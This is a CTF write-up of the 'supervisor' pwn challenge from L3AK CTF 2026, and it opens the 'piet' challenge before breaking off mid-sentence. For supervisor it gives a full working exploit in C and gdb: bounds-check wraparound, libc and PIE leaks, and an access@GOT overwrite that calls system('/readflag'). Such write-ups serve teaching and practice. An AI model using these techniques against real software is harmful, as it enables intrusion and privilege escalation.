+++
title = "l3ak ctf 2026: pwn writeup (supervisor, piet)"
date = "2026-08-05"
description = "Writeups for the supervisor and piet pwn challenges from L3AK CTF 2026."
tags = [
    "ctf",
    "pwn",
]
+++
# Intro
This weekend I played L3AK CTF 2026 with CTF Academy @ ASU.

We placed 11th.

I got first blood on supervisor (5 solves) and second solve on piet (17 solves).

This post covers both:

1. supervisor - an emulator-based sandbox
2. piet - an esolang interpreter that takes a .png as its input

# 1. Supervisor
[download](https://raw.githubusercontent.com/icctx/ctf/refs/heads/main/l3ak.2026/supervisor/pwn_supervisor.tar.gz)
```sh
|-- Dockerfile
|-- docker-compose.yml
|-- readflag.c
|-- supervisor
`-- supervisor.c

1 directory, 5 files
```

## Recon
```sh
$ pwn checksec ./supervisor
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

`Dockerfile`
```sh
FROM gcc:14 AS readflag
WORKDIR /build
COPY readflag.c .

RUN gcc -static -O2 -o readflag readflag.c

FROM ubuntu:24.04@sha256:4fbb8e6a8395de5a7550b33509421a2bafbc0aab6c06ba2cef9ebffbc7092d90

RUN apt-get update && \
    apt-get install -y --no-install-recommends socat && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY supervisor .

COPY --from=readflag /build/readflag /readflag
RUN chown root:root /readflag \
    && chmod +s /readflag

COPY flag.txt /flag.txt
RUN chown root:root /flag.txt \
    && chmod 0400 /flag.txt

USER ubuntu

EXPOSE 8000
CMD ["socat", "TCP-LISTEN:8000,reuseaddr,fork", "EXEC:./supervisor"]
```

`readflag.c`
```c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

int main() {
    char buf[0x100] = {0};
    int fd = open("/flag.txt", O_RDONLY);
    read(fd, buf, 0x100);
    write(STDOUT_FILENO, buf, strlen(buf));
    exit(0);
}
```

`supervisor.c`
```c
1729  int main(int argc, char **argv)
1730  {
1731      init();
1732      char path[0x50] = {0};
1733      if (get_file(path) != 0)
1734      {
1735          exit(1);
1736      }
1737      int listener = 0;
1738      pid_t pid = fork();
1739
1740      if (pid == 0)
1741      {
1742          struct sock_filter filter[] = {
1743              BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_USER_NOTIF),
1744          };
1745
1746          struct sock_fprog prog = {
1747              .len = sizeof(filter) / sizeof(filter[0]),
1748              .filter = filter,
1749          };
1750
1751          prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
1752
1753          listener = seccomp(SECCOMP_SET_MODE_FILTER,
1754                             SECCOMP_FILTER_FLAG_NEW_LISTENER,
1755                             &prog);
1756
1757          if (listener < 0)
1758          {
1759              perror("seccomp");
1760              return 1;
1761          }
1762
1763          // We immediately try to close, it will halt here until the supervisor steals the listener fd and handles the close syscall
1764          close(listener);
1765
1766          execve(path, NULL, NULL);
1767          perror("execve");
1768          _exit(1);
1769      }
1770
1771      while (listener == 0)
1772      {
1773          usleep(10);
1774          vm_read(pid, &listener, sizeof(listener), &listener);
1775      }
1776
1777      int pidfd = pidfd_open(pid, 0);
1778      // Steal the seccomp listener fd.
1779      listener = pidfd_getfd(pidfd, listener, 0);
1780
1781      init_sup();
1782      supervisor(listener, pid, pidfd);
1783      exit(0);
1784  }
```

The program reads our binary from stdin (`get_file`) into `/tmp/supervisorexecXXXXXX`, chmods it 0500, and forks.
The child sandboxes itself and then execves our binary.

The sandbox is defined by two calls.

- `prctl(PR_SET_NO_NEW_PRIVS, 1, ...)` lets a filter be installed without CAP_SYS_ADMIN and permanently blocks privilege gain through execve, so setuid binaries like `/readflag` are useless inside the child.
- The filter is one instruction: `BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_USER_NOTIF)`. `BPF_RET | BPF_K` returns a constant, with no comparison on the syscall number, so *every* syscall the child makes is suspended and handed to userspace. `SECCOMP_FILTER_FLAG_NEW_LISTENER` makes `seccomp()` return the fd those notifications arrive on.

`close(listener)` is a handshake: as the first syscall under the filter it blocks until handled, so the child can't reach execve before the parent is ready.

The parent polls the child's memory with `process_vm_readv` for the fd number, steals the fd with `pidfd_open` + `pidfd_getfd`, runs `init_sup()` (registers fd 0-2 as real, everything else the child opens is virtual), and enters `supervisor()`.

## Sandbox

### Architecture
In `supervisor()` we have the notification loop (select on both the listener and the pidfd, with req/resp alloca'd on the supervisor's stack), a synthetic filesystem, proxied fds, and a syscall dispatcher. The dispatcher itself splits in two: calls emulated entirely against that filesystem, and calls handed back to the real kernel with `SECCOMP_USER_NOTIF_FLAG_CONTINUE`.

Let's go through the supported syscalls to map our attack surface. There are 34 of them:

1. Fully emulated (21):
```c
open  openat  close  read  pread64  write  pwrite64  writev
lseek  dup  dup2  dup3  fstat  newfstatat  access  fadvise64
getpid  getuid  geteuid  getgid  getegid
```
`fadvise64` is a no-op returning 0, `getpid` always answers 1, and the four id calls (`getuid`, `geteuid`, `getgid`, `getegid`) always answer 100000. The child is told a uid it doesn't have.

2. Bookkeeping, then handed to the real kernel (2):
```c
execve  mmap
```
`execve` walks the fd table, `sup_close` everything marked cloexec, and only then sets `SECCOMP_USER_NOTIF_FLAG_CONTINUE`.
`mmap` rejects `MAP_SHARED` with `-EINVAL`, and for a file-backed mapping opens the underlying file itself and injects a real fd into the child with `SECCOMP_IOCTL_NOTIF_ADDFD` before continuing.

3. Direct passthrough (11), under the comment `// Just continute executing. Surely nothing can go wrong.` [sic]
```c
exit  exit_group  mprotect  munmap  brk  arch_prctl
set_tid_address  set_robust_list  prlimit64  getrandom  rseq
```

Everything else hits `default:` and returns `-ENOSYS`.

So the surface is the 21 emulated calls, and among them `pread64` and `pwrite64` are the ones that let us name both an offset and a length that the supervisor will act on. `lseek` names an offset too, and stores it with no check at all (`fds.list[fd].offset = offset` on `SEEK_SET`), so the same value reaches the read and write paths through the fd's own offset. The goal is RIP control in the supervisor and then `system("/readflag")`.

### Vulnerabilities
```c
typedef struct
{
    char name[PATH_MAX];
    uint64_t name_hash; // for quick checking of file name
    uint64_t refcnt : 60;
    uint64_t readperm : 1;
    uint64_t writeperm : 1;
    uint64_t execperm : 1;    // not really used
    uint64_t was_written : 1; // File has been written to in which case we have to keep the on memory data alive
    uint64_t realfile : 1;    // File was based on a real file
    uint64_t size;            // File size
    uint64_t cap;             // Capacity of mapped data
    void *data;
} file_sup_t;

file_sup_t files[0x100];
```

The comment on `was_written` is the one to keep in mind. `create_empty` sets that bit on every file we make, and `sup_file_dec_refcnt` only unmaps a slot when the bit is clear. Closing the fd never frees `data`, so the object we corrupt stays alive for the rest of the run.

`open("/tmp/pwn", O_CREAT|O_RDWR)` gives us one of these with `size = 0`, `cap = 0x1000`, `data = mmap(NULL, 0x1000, RW, MAP_PRIVATE|MAP_ANONYMOUS)`.

For this object to be safe, `data`/`cap` must describe a real mapping and `size <= cap`. Every access should be bounded by `cap` and only clamped to `size`. The code does neither: no `cap` check on the read path at all, and on writes a check whose arithmetic wraps.

#### The bounds check wraps
```c
if (offset + count > files[fileid].cap)
{
    size_t tmp_cap = files[fileid].cap;
    files[fileid].cap = ((offset + count) + 0x1000 - 1) & ~(0x1000 - 1);
    files[fileid].data = mremap(files[fileid].data, tmp_cap, files[fileid].cap, MREMAP_MAYMOVE);
}

size_t res = vm_read(pid, files[fileid].data + offset, count, buf);
```
The comparison and the copy use the same unvalidated offset, but only the *comparison* can wrap. `pwrite64(fd, buf, 0x1000, -0x1000)` makes `offset + count` exactly 0, so the branch is skipped and `cap` and `data` stay as they are. The copy still happens at `data - 0x1000`, one page below the mapping.

#### size takes its value from an error code
```c
size_t res = vm_read(pid, files[fileid].data + offset, count, buf);
if (offset + res > files[fileid].size)
    files[fileid].size = offset + res;
if (update_offset)
    fd->offset = offset + res;
return res;
```
`res` is how many bytes actually made it across (whatever `vm_read` returned), and it feeds three things: the value `pwrite64` reports back to the guest, the descriptor's own cursor, and the new end of the file, `size = offset + res`. The last one is where the damage is. The logic is reasonable on its face: we wrote `res` bytes starting at `offset`, so the file is now `offset + res` long.

The problem is the type. `vm_read` returns `ssize_t` and answers -1 when the copy fails, and the address that fails here belongs to the supervisor, not to us: its signature is `vm_read(pid, buf, count, remote_addr)`, so in `vm_read(pid, files[fileid].data + offset, count, buf)` it is `data + offset` that has to be mapped locally, while `buf` is the perfectly valid source in the child. `res` is declared `size_t`, so that error code becomes `0xFFFFFFFFFFFFFFFF`, a length of 2^64-1 bytes. The error return goes straight into `size`.

That single conversion is what the whole chain rests on, because `size` is the only bound on the read path and `offset + res` is the only way to set it. Both terms have to be large at once, a condition only a failure satisfies:

- if the write **succeeds**, `res` is capped by `count`, and the grow branch guarantees `offset + count <= cap` on the path that skips it, so `offset + res` can never climb above `cap`. With `offset = -0x1000` and `count = 0x1000` the sum comes out 0 and nothing changes;
- if the write **fails**, `res = SIZE_MAX` and the sum wraps to `0xFFFFFFFFFFFFEFFF`.

The *failure* is what we are after, and `data - 0x1000` is picked precisely because there is a hole there. `size` is supposed to stay at most `cap`, and it ends up at almost 2^64 while `cap` is still `0x1000`. The assignment only happens when `offset + res` exceeds the current `size`.

#### The read path only checks size
```c
if (offset + count > files[fileid].size)
{
    count = files[fileid].size - offset;
}
size_t res = vm_write(pid, files[fileid].data + offset, count, buf);
```
`cap` isn't consulted, `data` isn't consulted, and there is no lower bound at all. Offset is added to data in full 64-bit arithmetic, so negative values walk backwards. With `size` inflated the clamp never fires, and `pread64` is an arbitrary read of the supervisor's address space anchored at `data`.

#### cap is written before mremap is checked
```c
files[fileid].cap = ((offset + count) + 0x1000 - 1) & ~(0x1000 - 1);
files[fileid].data = mremap(files[fileid].data, tmp_cap, files[fileid].cap, MREMAP_MAYMOVE);
```
`cap` is assigned *before* `mremap` is called, and the result is stored without comparing against `MAP_FAILED`, which is `(void *)-1`. The same file elsewhere gets this right: `create_existing:367` compares against `MAP_FAILED`. A failed grow leaves `cap` huge and `data` at `-1`, a state nothing later rolls back.

Each primitive comes from a different failing call:

- the **AAR** needs `vm_read` to fail on the hole below `data`, which puts `SIZE_MAX` in `res` and leaves `size` at almost 2^64;
- the **AAW** needs `mremap` to fail with ENOMEM, which puts `(void *)-1` in `data` and leaves `cap` huge.

`res` belongs to the first one only. It reappears in the second in a way that happens to suit us: the failed write recomputes `offset + res = 0xF00000000000 + SIZE_MAX = 0xEFFFFFFFFFFF`, which is below the already poisoned `size`, and the `>` guard leaves it alone.

### Building AAR

The binary we upload runs as the child, inside the sandbox, so it gets only the 34 syscalls the dispatcher knows. A `-static` glibc build would nearly fit, since the passthrough group is essentially glibc's startup path, but every syscall glibc makes on its own is one we did not choose, and anything outside the 34 comes back `-ENOSYS`. The payload is freestanding instead: `gcc -O2 -static -nostdlib -nostartfiles -no-pie`, its own entry point, raw syscalls:

```c
__asm__(
    ".global _start\n"
    "_start:\n"
    "  xor %rbp, %rbp\n"
    "  and $-16, %rsp\n"
    "  call payload\n"
    "  hlt\n");
```

`sys3`/`sys4` are inline `syscall` stubs, `say`/`leak` write to fd 1, `die` prints and calls `exit_group`. The offsets are baked in at compile time:

```c
#ifndef LIBC_ENTRY
#define LIBC_ENTRY  0x2a390UL  // e_entry, tells libc from ld.so and the PIE
#define ANCHOR_OFF  0x204698UL // _IO_2_1_stdout_+0xd8
#define ANCHOR_BIAS 0x202030UL // what that slot holds on disk
#define ENVIRON_OFF 0x20ad58UL
#define SYSTEM_OFF  0x58750UL
#define ACCESS_GOT  0x8118UL
#endif
```

```c
static s64 fd;
static u64 bias;

static s64 aread(u64 addr, unsigned long n) { return sys4(SYS_pread64, fd, buf, n, (s64)(addr + bias)); }
static s64 awrite(u64 addr, const void *src, unsigned long n) { return sys4(SYS_pwrite64, fd, src, n, (s64)(addr + bias)); }
```

`bias` is what an address means at that moment: 0 while everything is relative to `data`, `-data_abs` once we know where `data` is, 1 once `data` is `(void *)-1`.

The whole chain is four stages on one file object:

```c
void payload(void)
{
    say("[*] payload start\n");

    // /tmp/pwn is not on disk: a fresh file_sup_t, cap = 0x1000, size = 0
    fd = sys3(SYS_open, "/tmp/pwn", O_CREAT | O_RDWR, 0666);
    leak("FD", (u64)fd);
    if (fd < 0)
        die("open failed");

    say("[~] poison\n");
    poison_size();

    say("[~] leak\n");
    u64 libc_base, pie;
    leak_bases(&libc_base, &pie);

    say("[~] break\n");
    break_data(libc_base);

    say("[~] hijack\n");
    hijack_got(libc_base, pie);

    say("[*] done\n");
    sys3(SYS_exit_group, 0, 0, 0);
}
```

```c
// The write has to fail: -1 from vm_read is what lands in size.
static void poison_size(void)
{
    memset(buf, 0x41, sizeof(buf));
    s64 r = sys4(SYS_pwrite64, fd, buf, PAGE, (s64)(0UL - (u64)PAGE));
    say(r < 0 ? "[+] size poisoned (vm_read fell into the hole below data)\n"
              : "[!] write succeeded - the page below data was mapped\n");

    bias = 0;
    if (aread((u64)PAGE, 16) <= 0)
        die("read past cap still clamped - size was not poisoned");
}
```

`0UL - PAGE` is `0xFFFFFFFFFFFFF000`, and it has to do two jobs at once, which is what pins it to exactly `-0x1000`:

- `offset + count` wraps to 0, so `if (offset + count > cap)` is false, no `mremap`, mapping untouched;
- `data + offset` is `data - 0x1000`, unmapped, so `vm_read` returns -1 → `res = SIZE_MAX` → `size = offset + res = 0xFFFFFFFFFFFFEFFF`.

Whether the page below `data` is mapped isn't ours to control, so the payload prints which way it went instead of assuming.

In practice the page below `data` was free: `vmmap` on it comes back empty in the gdb session below. The payload has no fallback for the other case, because reconnecting costs nothing: `socat` forks a fresh supervisor per connection (that's the `fork` in the Dockerfile's `CMD`), and the `[!] write succeeded` line says immediately which case we got.

Rebuilt from the handout source with ASLR off, so these addresses are rounder
than the payload output further down:

```sh
gef> b supervisor.c:758          # write_fd, right at the grow check
gef> c

Breakpoint 1, write_fd (pid=0x1e3, fd=0x5555556622e8, buf=0x405380, 
    count=0x1000, offset_given=0xfffffffffffff000, update_offset=0x0)
    at supervisor.c:758
758	    if (offset + count > files[fileid].cap)
gef> p/x offset + count          # wraps to zero, so the grow branch is skipped
$1 = 0x0
gef> x/3gx &files[0].size        # size, cap, data
0x55555555f0b8 <files+4120>:	0x0000000000000000	0x0000000000001000
0x55555555f0c8 <files+4136>:	0x00007ffff7fbc000
gef> vmmap 0x7ffff7fbb000        # data-0x1000, where the copy is about to land
Start              End                Size               Offset             Perm Path
gef> b supervisor.c:770          # after the size update
gef> c
gef> p (ssize_t) res
$2 = 0xffffffffffffffff
gef> x/3gx &files[0].size        # size is ~2^64; cap and data never moved
0x55555555f0b8 <files+4120>:	0xffffffffffffefff	0x0000000000001000
0x55555555f0c8 <files+4136>:	0x00007ffff7fbc000
```

The read at `0x1000` that closes the function is already outside the mapping. If it comes back with bytes, `read_fd`'s clamp is dead and we have an AAR relative to `data`.

```c
// libc lives below data, so the window leans backwards
#define SCAN_LO (-0x1000000L)
#define SCAN_HI ( 0x400000L)

// Offset of the libc image relative to data. An anonymous region abuts libc
// from below, so every mapped page has to be tested, not just the first.
static s64 find_libc(void)
{
    for (s64 off = SCAN_LO; off < SCAN_HI; off += PAGE) {
        if (aread((u64)off, 0x20) <= 0)
            continue;
        if (is_elf(buf) &&
            buf[0x10] == 3 && buf[0x11] == 0 &&    // ET_DYN
            buf[0x12] == 0x3e && buf[0x13] == 0 && // EM_X86_64
            ld64(buf + 0x18) == LIBC_ENTRY)
            return off;
    }
    die("libc not in range - widen SCAN_LO");
}
```

The supervisor's PIE, `ld.so` and `libc` are all mapped here, so the magic alone isn't enough: `e_entry` at `+0x18` tells them apart.

`find_libc` gives an offset, not an address. `_IO_2_1_stdout_+0xd8` is a vtable slot: on disk it holds the link-time address of `_IO_file_jumps`, at runtime that value plus the load base. Subtract the on-disk value and the base falls out, and the distance from `data` to libc is already known, so `data`'s own address follows.

```c
// Relative AAR -> absolute: the anchor minus its on-disk value is the libc
// base, and the scan offset gives data.
static void leak_bases(u64 *out_libc, u64 *out_pie)
{
    int ok;

    s64 libc_off = find_libc();
    if (aread((u64)(libc_off + (s64)ANCHOR_OFF), 8) != 8)
        die("anchor unreadable");

    u64 anchor    = ld64(buf);
    u64 libc_base = anchor - ANCHOR_BIAS;
    u64 data_abs  = libc_base - (u64)libc_off;

    leak("ANCHOR", anchor);
    leak("LIBCOFF", (u64)libc_off);
    leak("LIBC", libc_base);
    leak("DATA", data_abs);
    if (libc_base & 0xfff)
        die("libc base not page aligned - wrong anchor");

    bias = 0UL - data_abs;

    u64 pie = find_pie(libc_base);
    leak("PIE", pie);
    leak("SYSTEM", libc_base + SYSTEM_OFF);
    leak("GOT", pie + ACCESS_GOT);
    leak("GOTOLD", rd64(pie + ACCESS_GOT, &ok));
    if (!ok)
        die("GOT unreadable");

    *out_libc = libc_base;
    *out_pie = pie;
}
```

Both constants come out of the target's own libc at build time:
```python
anchor_off = libc.symbols["_IO_2_1_stdout_"] + 0xD8
anchor_bias = u64(libc.read(anchor_off, 8))
```

A load base is always page-aligned, so low bits set means we anchored on the wrong pointer. `bias = -data_abs` makes `aread(addr, n)` take real addresses, and nothing else in the payload changes (`aread` and `awrite` are the only readers of `bias`).

```
ANCHOR  0x0000703f606a8030
LIBCOFF 0xffffffffffdec000
LIBC    0x0000703f604a6000
DATA    0x0000703f606ba000
```

`LIBCOFF` is negative: libc sits `0x214000` below our page.

### Leaking the PIE base

libc gives us `system`, but the GOT slot we want to overwrite lives in the supervisor's own image, and that image is PIE. libc also hands us the way in: `environ`, a libc variable holding the address of the `envp` array, which lives on the stack.

```c
// environ -> envp on the stack -> auxv right past its NULL -> AT_PHDR.
static u64 find_pie(u64 libc_base)
{
    int ok;
    u64 p = rd64(libc_base + ENVIRON_OFF, &ok);
    if (!ok)
        die("environ unreadable");
    leak("ENVIRON", p);

    int i;
    for (i = 0; i < 512; i++, p += 8) {
        u64 e = rd64(p, &ok);
        if (!ok)
            die("envp walk ran off the stack");
        if (e == 0)
            break;
    }
    if (i == 512)
        die("end of envp not found");
    p += 8;

    u64 at_phdr = 0, at_entry = 0;
    for (i = 0; i < 64; i++, p += 16) {
        u64 type = rd64(p, &ok);
        if (!ok)
            break;
        u64 v = rd64(p + 8, &ok);
        if (!ok)
            break;
        if (type == AT_NULL)
            break;
        if (type == AT_PHDR)
            at_phdr = v;
        if (type == AT_ENTRY)
            at_entry = v;
    }
    leak("ATPHDR", at_phdr);
    leak("ATENTRY", at_entry);
    if (!at_phdr)
        die("AT_PHDR not found");

    // e_phoff is 0x40, so the headers sit in the image's first page
    u64 pie = at_phdr & ~0xfffUL;
    if (aread(pie, 4) != 4 || !is_elf(buf))
        die("no ELF header at AT_PHDR & ~0xfff");
    return pie;
}
```

Walking `envp` to its NULL costs one read per variable and lands on the auxiliary vector, which the ABI puts immediately after it. From there it's `(type, value)` pairs until `AT_NULL`, and `AT_PHDR` is the address of the supervisor's own program headers. `e_phoff` is `0x40` for a normal x86-64 ELF, so masking off the low twelve bits gives the load base, confirmed by finding `\x7fELF` there.

With both bases in hand the two addresses we actually need fall out:

```sh
ENVIRON 0x00007ffcd4a4bad8
ATPHDR  0x0000602589230040
ATENTRY 0x0000602589232800
PIE     0x0000602589230000
SYSTEM  0x0000703f604fe750
GOT     0x0000602589238118
GOTOLD  0x0000602589232260
```

`ATPHDR` is `PIE + 0x40`, exactly where the program headers belong. `GOTOLD` is what `access@GOT` holds right now, and it points back into the supervisor's own image, so the read reaches the binary we want to write to, not just libc.

### Building AAW

Let's build the write primitive now. `pwrite64` goes through `write_fd`, and there `data` is still a valid one-page mapping with `cap = 0x1000`, so anything past the end takes the grow branch instead of writing where we want. Take that branch on purpose and make it fail.

```c
// big enough that mremap is guaranteed to come back ENOMEM
#define BREAK_OFF 0xF00000000000UL

// cap is committed before mremap is checked, so a failed grow leaves
// data = (void *)-1 and data + (ADDR + 1) == ADDR. The poisoned size survives.
static void break_data(u64 libc_base)
{
    sys4(SYS_pwrite64, fd, buf, 8, (s64)BREAK_OFF);
    bias = 1;

    if (aread(libc_base, 4) != 4 || !is_elf(buf))
        die("absolute mode is off - mremap apparently succeeded");
    say("[+] absolute AAR/AAW\n");
}
```

A grow to 0xF00000001000 bytes always fails, so `mremap` returns `MAP_FAILED` and that lands in `data` while `cap` keeps the huge value nobody rolls back. With `data == (void *)-1`, `data + off` is just `off - 1`, so hitting an absolute address is passing `ADDR + 1`. Hence `bias = 1`, and `data_abs` stops mattering.

Same session, one breakpoint later. This time the grow branch does run:

```sh
gef> delete 1 2                  # or they both fire again on the way in
gef> b supervisor.c:765          # after the mremap block, before the copy
gef> c

Breakpoint 3, write_fd (pid=0x1e3, fd=0x5555556622e8, buf=0x405380, count=0x8, 
    offset_given=0xf00000000000, update_offset=0x0) at supervisor.c:765
765	    size_t res = vm_read(pid, files[fileid].data + offset, count, buf);
gef> p files[0].data             # MAP_FAILED, stored without a check
$3 = (void *) 0xffffffffffffffff
gef> p/x files[0].cap            # committed before mremap was ever called
$4 = 0xf00000001000
gef> p/x files[0].size           # the poisoned value survives untouched
$5 = 0xffffffffffffefff
```

The failed write still runs the `size` update, but with `res = SIZE_MAX` it reports `offset + res = 0xEFFFFFFFFFFF`, below the `0xFFFFFFFFFFFFEFFF` already there, and the update is `>`-guarded.

### Hijacking the supervisor

An arbitrary write needs a target that the supervisor actually calls, with an argument we own. `access` is both.

Where its RELRO window ends decides whether that slot is writable:
```sh
$ readelf -lW supervisor | grep RELRO
  GNU_RELRO      0x006dd0 0x0000000000007dd0 0x0000000000007dd0 0x000230 0x000230 R   0x1
$ readelf -dW supervisor | grep -c BIND_NOW
0
```

RELRO ends at 0x8000, while `.got.plt` runs from 0x7fe8 to 0x8158 and nothing sets `BIND_NOW`. Only its first three entries fall inside the read-only window: everything from 0x8000 up stays writable for the life of the process, and `access` sits at 0x8118. The slot comes straight out of the binary:

```python
def sup_constants(sup_path: Path):
    sup = ELF(str(sup_path), checksec=False)
    got = sup.got["access"]
    return {"ACCESS_GOT": got}
```

The call site is the `access` dispatcher. Our path is copied out of the child, and when the synthetic filesystem doesn't recognise it, the supervisor asks the real one:
```c
case __NR_access:
{
    char pathname[PATH_MAX];
    if (read_path(pid, (void *)req->data.args[0], pathname) == -1) { ... }
    int mode = req->data.args[1];
    if (mode == F_OK)
    {
        if (search_file(pathname) == -1 && access(pathname, F_OK) == -1)
```

`/readflag` is not in the synthetic filesystem, so `search_file` returns -1 and the real `access(pathname, F_OK)` runs through the GOT, with a string we control end to end. Point the slot at `system` and that call becomes `system("/readflag")`.

```c
// Partial RELRO: GNU_RELRO ends at 0x8000, access@GOT sits at 0x8118. /readflag
// is not in the synthetic filesystem, so the dispatcher falls through to access().
static void hijack_got(u64 libc_base, u64 pie)
{
    int ok;
    u64 got = pie + ACCESS_GOT;
    u64 val = libc_base + SYSTEM_OFF;

    if (awrite(got, &val, 8) != 8)
        die("GOT write failed");
    leak("GOTNEW", rd64(got, &ok));
    if (!ok)
        die("GOT unreadable after write");

    say("[+] access(\"/readflag\") -> system(\"/readflag\")\n");
    memcpy(pathbuf, "/readflag", 10);
    sys3(SYS_access, pathbuf, F_OK, 0);

    // give the supervisor a moment to flush the shell output to the socket
    for (int i = 0; i < 200; i++)
        sys3(SYS_getpid, 0, 0, 0);
}
```

`pathbuf` is 0x2000 rather than 10 bytes because `read_path` copies a full `PATH_MAX` out of our address space, which is 0x1000 here, and the buffer is sized with room to spare.

`NO_NEW_PRIVS` was only ever set in the child, so the shell the supervisor spawns keeps `/readflag`'s setuid bit. Its stdout is the socket we're connected on for a plainer reason: the Dockerfile runs `socat TCP-LISTEN:8000,reuseaddr,fork EXEC:./supervisor`, so the supervisor's own fd 0 and 1 *are* the connection, and `system` passes them straight to the shell.

The same call from the supervisor's side:

```sh
gef> b write_fd
gef> c

Breakpoint 1, 0x0000555555557e00 in write_fd ()
gef> x/gx 0x55555555c118         # access@got.plt, before the write
0x55555555c118 <access@got[plt]>:	0x0000555555556260
gef> delete
gef> b system
gef> c

Breakpoint 2, __libc_system (line=0x7fffffffdb20 "/readflag")
    at ../sysdeps/posix/system.c:202
gef> x/gx 0x55555555c118
0x55555555c118 <access@got[plt]>:	0x00007ffff7e00750
gef> bt 3
#0  __libc_system (line=0x7fffffffdb20 "/readflag")
    at ../sysdeps/posix/system.c:202
#1  0x0000555555559432 in supervisor ()
#2  0x0000555555556767 in main ()
```

The backtrace closes the loop: `__libc_system` with `line` pointing at the
string we handed to `access` — entered straight out of `supervisor()`.

```sh
GOT     0x0000602589238118
GOTOLD  0x0000602589232260
GOTNEW  0x0000703f604fe750
[+] access("/readflag") -> system("/readflag")
flag{local}
```

Summary: an unvalidated offset, a bounds check that wraps past
it, an error code widened into a length, and an `mremap` result stored
unchecked — a read relative to `data` first, then an absolute one, then a
single 8-byte write to `access@GOT`.

# 2. Piet
[download](https://raw.githubusercontent.com/icctx/ctf/refs/heads/main/l3ak.2026/piet/pwn_piet.tar.gz)
```sh
|-- Dockerfile
|-- piet
`-- piet.c

1 directory, 3 files
```

We send a PNG on stdin, libpng decodes it, the program dumps every pixel in hex and
then executes the image as a [Piet](https://www.dangermouse.net/esoteric/piet.html)
program.

Piet is a 2D esolang where the program is a picture. Connected blocks of one colour
are the instructions; a pointer walks between them, and the instruction executed is
the *delta* between the block being left and the block being entered: hue step by
lightness step, indexed into a 6x3 table.

## Recon
```sh
$ pwn checksec ./piet
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

`Dockerfile`
```sh
FROM ubuntu@sha256:f3d28607ddd78734bb7f71f117f3c6706c666b8b76cbff7c9ff6e5718d46ff64 AS app

WORKDIR /app

RUN apt-get update && \
    apt-get install -y --no-install-recommends libpng-dev socat && \
    rm -rf /var/lib/apt/lists/*

COPY piet .

EXPOSE 1337

CMD exec socat TCP-LISTEN:1337,reuseaddr,fork EXEC:"/app/piet"
```

Dynamically linked against `libpng16` and glibc 2.43.

Full RELRO shapes everything that follows: `.got` is mapped read-only before `main`,
so overwriting a GOT entry is off the table. The only writable code pointer left is
a return address, which means the target is the stack.

`piet.c`
```c
438  int main(void) {
439      setbuf(stdout, NULL);
440
441      Image *img = load_png();
442      if (!img) return 1;
443
444      printf("Size: %d x %d\n", img->width, img->height);
445      for (int y = 0; y < img->height; y++) {
446          for (int x = 0; x < img->width; x++) {
447              printf("%06X ", img->pixels[y][x]);
448          }
449          printf("\n");
450      }
451      interpret_program(img);
452      free_image(img);
453      return 0;
454  }
```

The dump is our own image, echoed back, and it carries no process state.

`doInstruction` resolves the colour delta against the 6x3 table:

```c
static const instruction_fn INSTRUCTIONS[6][3] = {
    { op_nop,     op_push,   op_pop    },
    { op_add,     op_sub,    op_mul    },
    { op_div,     op_mod,    op_not    },
    { op_gt,      op_ptr,    op_switch },
    { op_dup,     op_roll,   op_up     },
    { op_in_c,    op_nuh_uh, op_down   },
};

void doInstruction(int old_hex, int new_hex, int block_size, ProgramState *state) {
    color old_color = lookupColor(old_hex);
    color new_color = lookupColor(new_hex);
    if (old_color < 0 || new_color < 0) return; /* black, white, or unrecognized */

    int hue_step   = (hue(new_color)       - hue(old_color)       + 6) % 6;
    int light_step = (lightness(new_color) - lightness(old_color) + 3) % 3;

    INSTRUCTIONS[hue_step][light_step](state, block_size);
}
```

The operand is `block_size`, the number of codels in the block we just left, so
`push k` is literally a block of k pixels exited through the push delta.

The language spec gives this table, hue steps down the side and lightness steps
across:

```
            none        1 darker     2 darker
none        -           push         pop
1 step      add         subtract     multiply
2 steps     divide      mod          not
3 steps     greater     pointer      switch
4 steps     duplicate   roll         in(number)
5 steps     in(char)    out(number)  out(char)
```

Cell for cell the array is that table with three names replaced, all three in the last
two rows: `in(number)` is `op_up`, `out(number)` is `op_nuh_uh`, and `out(char)` is
`op_down`. Two of the three replacements move the stack index, and both output
instructions are gone.

The column a real colour transition reaches, though, is not the one the spec names.
`lookupColor` numbers the shades with the pastels highest, `packColor(2, ...)` down to
`packColor(0, ...)` for the darks, so `light_step` counts steps toward *lighter* and
the two non-zero columns trade places. One shade darker at a constant hue is
`1 darker` in the spec and runs `push`; here it computes `light_step = 2` and runs
`pop`. The hue axis is unaffected. Colours therefore have to be derived from
`piet.c`'s own numbering, and a delta worked out from the spec table executes the
wrong instruction.

The machine those instructions run on is one struct and one local array:

```c
typedef struct {
    int32_t *stack;
    int stack_depth;
    dir CC;
    dir DP;
    int row;
    int col;
} ProgramState;

void interpret_program(Image *img) {
    int32_t stack[256];
    ProgramState state = {
        .stack = stack,
        .stack_depth = 0,
        ...
    };

    while (next_codel(img, &state)){
        color col = lookupColor(img->pixels[state.row][state.col]);
    }
    printf("halted\n");
}
```

## Encoding

The program runs along row 0, matching the starting `DP = RIGHT`, `CC = LEFT`. Column
`x` is a single-colour block of height `h_x` in rows `0..h_x-1`, black below. Moving
from column `x` to `x+1` executes the instruction encoded by the colour delta and
receives `block_size = h_x`, the size of the block being left.

So `push k` is a column of height `k`, and the largest push is the image height.
Wider constants are assembled digit by digit:

```python
        bits = SYNTH_BASE.bit_length() - 1
        self.push(1)
        self.push(1)
        self.sub()                                      # 0
        for i in range(32 // bits - 1, -1, -1):
            self.push(SYNTH_BASE)
            self.mul()
            digit = (value >> (bits * i)) & (SYNTH_BASE - 1)
            if digit:
                self.push(digit)
                self.add()
```

`push 0` is impossible (a block has at least one codel), so zero digits simply skip
their `add`. The base is 16, and nothing the program pushes is larger, so the image
comes out 16 codels tall.

## Interpreter

The data stack is a 1 KB buffer in `interpret_program`'s own frame, addressed through
